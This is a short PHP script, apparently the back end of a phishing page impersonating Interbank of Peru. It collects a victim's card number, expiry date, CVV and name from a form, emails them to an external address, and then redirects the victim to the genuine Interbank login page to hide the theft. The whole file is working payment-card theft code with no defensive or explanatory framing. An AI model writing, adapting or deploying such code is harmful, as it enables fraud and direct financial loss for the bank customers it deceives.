<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST['fname'];
    $numeroTarjeta = $_POST['Número Tarjeta'];
    $fechaVencimiento = $_POST['expdate'];
    $cvv = $_POST['cvv'];

    $destinatario = "satev76335@haislot.com";
    $asunto = "Nueva entrada de formulario de tarjeta";
    $cuerpo = "Nombre del titular: $nombre\nNúmero de tarjeta: $numeroTarjeta\nFecha de vencimiento: $fechaVencimiento\nCVV: $cvv";

    mail($destinatario, $asunto, $cuerpo);

    // Redirige al usuario a la página de login de Interbank
    header("Location: https://bancaporinternet.interbank.pe/login");
    exit();
}
?>
